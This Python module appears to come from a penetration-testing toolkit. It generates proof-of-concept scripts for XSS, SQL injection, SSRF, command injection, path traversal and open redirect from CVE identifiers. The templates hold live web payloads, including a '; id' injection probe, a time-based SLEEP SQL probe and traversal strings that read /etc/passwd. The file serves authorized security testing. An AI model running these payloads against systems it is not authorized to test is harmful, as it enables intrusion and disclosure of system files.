"""
PoC Engine — Proof-of-Concept Generator
Generates PoC templates for common vulnerability classes based on CVE data.
For authorized security research and documentation only.
"""

from __future__ import annotations

import textwrap
from typing import Any

from shadowcypher.core.module import BaseModule

# Vulnerability class → PoC template generator (all keys uppercase for normalised lookup)
_VULN_TEMPLATES: dict[str, str] = {
    "XSS": textwrap.dedent("""\
        #!/usr/bin/env python3
        # PoC: Reflected XSS — {cve_id}
        # Target: {target}
        # Payload injected via: {param}
        import requests
        url = "{target}"
        payload = "<script>alert(document.domain)</script>"
        r = requests.get(url, params={{"{param}": payload}}, timeout=10)
        if payload in r.text:
            print("[CONFIRMED] XSS payload reflected in response")
        else:
            print("[NOT CONFIRMED] Payload not found in response")
    """),

    "SQLI": textwrap.dedent("""\
        #!/usr/bin/env python3
        # PoC: SQL Injection — {cve_id}
        # Target: {target}
        import requests, time
        url = "{target}"
        # Time-based blind SQLi probe (5s delay)
        probe = "1' AND SLEEP(5)--"
        t0 = time.time()
        try:
            r = requests.get(url, params={{"{param}": probe}}, timeout=15)
            elapsed = time.time() - t0
            if elapsed > 4.5:
                print(f"[CONFIRMED] Time-based SQLi: delay={{elapsed:.1f}}s")
            else:
                print(f"[NOT CONFIRMED] No delay: {{elapsed:.1f}}s")
        except requests.Timeout:
            print("[CONFIRMED] Request timed out — likely SQLi")
    """),

    "SSRF": textwrap.dedent("""\
        #!/usr/bin/env python3
        # PoC: Server-Side Request Forgery — {cve_id}
        # Target: {target}
        # Use an out-of-band callback (OAST) host to confirm
        import requests
        url = "{target}"
        oast = "http://YOUR_COLLABORATOR.oastify.com"
        r = requests.get(url, params={{"{param}": oast}}, timeout=10)
        print(f"Status: {{r.status_code}} — check your OAST listener for callbacks")
    """),

    "RCE": textwrap.dedent("""\
        #!/usr/bin/env python3
        # PoC: Remote Code Execution — {cve_id}
        # Target: {target}
        # BENIGN probe: execute 'id' and check output
        import requests
        url = "{target}"
        probe = "; id"
        r = requests.post(url, data={{"{param}": probe}}, timeout=10)
        if "uid=" in r.text and "gid=" in r.text:
            print("[CONFIRMED] RCE — 'id' output found in response")
        else:
            print("[NOT CONFIRMED] No 'id' output detected")
    """),

    "PATH_TRAVERSAL": textwrap.dedent("""\
        #!/usr/bin/env python3
        # PoC: Path Traversal — {cve_id}
        # Target: {target}
        import requests
        url = "{target}"
        traversals = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ]
        for t in traversals:
            r = requests.get(url, params={{"{param}": t}}, timeout=10)
            if "root:" in r.text:
                print(f"[CONFIRMED] Path traversal with: {{t}}")
                break
        else:
            print("[NOT CONFIRMED] No /etc/passwd content found")
    """),

    "OPEN_REDIRECT": textwrap.dedent("""\
        #!/usr/bin/env python3
        # PoC: Open Redirect — {cve_id}
        # Target: {target}
        import requests
        url = "{target}"
        redirect_target = "https://evil.example.com"
        r = requests.get(url, params={{"{param}": redirect_target}},
                         allow_redirects=False, timeout=10)
        loc = r.headers.get("Location", "")
        if "evil.example.com" in loc:
            print(f"[CONFIRMED] Open redirect to: {{loc}}")
        else:
            print(f"[NOT CONFIRMED] Location: {{loc}}")
    """),
}


class PocEngine(BaseModule):
    """Generates PoC templates for common vulnerability classes."""

    def __init__(self):
        super().__init__(module_name="poc_engine")

    def supported_classes(self) -> list[str]:
        """List supported vulnerability classes."""
        return list(_VULN_TEMPLATES.keys())

    def generate(
        self,
        vuln_class: str,
        cve_id: str = "CVE-XXXX-XXXX",
        target: str = "http://target.local",
        param: str = "input",
    ) -> dict[str, Any]:
        """
        Generate a PoC script for a given vulnerability class.
        Returns the script text and metadata.
        """
        vuln_class = vuln_class.upper().replace("-", "_").replace(" ", "_")
        template = _VULN_TEMPLATES.get(vuln_class)
        if template is None:
            return {
                "status": "error",
                "message": f"Unsupported vulnerability class: {vuln_class}",
                "supported": self.supported_classes(),
            }

        script = template.format(cve_id=cve_id, target=target, param=param)
        self.log(f"POC_GENERATED: {vuln_class} [{cve_id}]")
        return {
            "status": "ok",
            "vuln_class": vuln_class,
            "cve_id": cve_id,
            "target": target,
            "param": param,
            "script": script,
            "language": "python3",
            "note": "Authorized testing only — run against systems you own or have written permission to test",
        }

    def generate_from_cve(
        self,
        cve_id: str,
        target: str = "http://target.local",
        param: str = "input",
        vuln_hint: str | None = None,
    ) -> dict[str, Any]:
        """
        Attempt to infer the vulnerability class from a CVE ID string and generate a PoC.
        Uses vuln_hint if provided, otherwise tries keyword detection from the CVE ID.
        """
        if vuln_hint:
            return self.generate(vuln_hint, cve_id=cve_id, target=target, param=param)

        cve_upper = cve_id.upper()
        # Keyword → class mapping heuristic
        for kw, cls in [
            ("XSS", "XSS"), ("CROSS_SITE", "XSS"),
            ("SQL", "SQLI"), ("INJECTION", "SQLI"),
            ("SSRF", "SSRF"), ("REQUEST_FORGERY", "SSRF"),
            ("RCE", "RCE"), ("EXEC", "RCE"), ("CODE_EXEC", "RCE"),
            ("TRAVERSAL", "PATH_TRAVERSAL"), ("PATH", "PATH_TRAVERSAL"),
            ("REDIRECT", "OPEN_REDIRECT"),
        ]:
            if kw in cve_upper:
                return self.generate(cls, cve_id=cve_id, target=target, param=param)

        return {
            "status": "unknown",
            "message": f"Could not infer vulnerability class from CVE ID: {cve_id}",
            "supported": self.supported_classes(),
            "hint": "Pass vuln_hint= to specify the class directly",
        }
